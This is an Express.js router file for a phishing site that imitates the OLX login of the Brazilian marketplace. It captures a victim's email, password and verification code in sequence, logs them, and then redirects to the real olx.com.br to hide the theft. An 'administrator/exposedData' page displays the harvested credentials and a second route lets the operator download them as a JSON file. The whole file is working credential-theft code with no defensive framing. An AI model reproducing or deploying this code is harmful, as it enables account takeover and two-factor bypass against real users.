const app = require("express");
const route = app.Router();
const fs = require("fs");

let DadosUser = {
    email : "",
    senha : "",
    coding: ""
}

let caminho_json = "./dados.json";

let write_file = async ()=>{
    fs.writeFileSync(caminho_json,JSON.stringify(DadosUser) , error =>{
        if(error){
            console.log("dados nao escritos no arquivo json")
        }
    })
}

// tela da olx de inicio (email)
route.get("/login", (req,res) =>{
    res.render("home");
})

route.post("/dadosEmail", (req,res) =>{

    let {email} = req.body;
    DadosUser.email = email;
    console.log(JSON.stringify(DadosUser, null , 3));
    res.redirect("/home/Credentials");

});

route.get("/Credentials",(req,res)=>{
    res.render("passwd", {email : DadosUser.email || "exemple@gmail.com"});
});

route.post("/DataPass",(req,res)=>{
    let {passwd} = req.body;
    DadosUser.senha = passwd;
    console.log(JSON.stringify(DadosUser, null , 3));
    res.redirect("/home/Verification");
})

route.get("/Verification", (req , res) =>{
    res.render("coding");
});

route.post("/dadosCoding", (req, res)=>{
    let {coding} = req.body;
    DadosUser.coding = coding;
    console.log(JSON.stringify(DadosUser, null , 3));
    res.redirect("https://www.olx.com.br/");
})


route.get("/administrator/exposedData", (req, res)=>{
    res.render("exposed",{ DadosUser });
})

route.get("/administrator/exposedData/dawnload",(req , res)=>{
    write_file();
    let file_upload = "./dados.json"
    res.download(file_upload, "dados.json", err =>{
        if(err){
            console.log(`errro ao fazer dawload : ${err}`)
        }
    });
})



module.exports = route;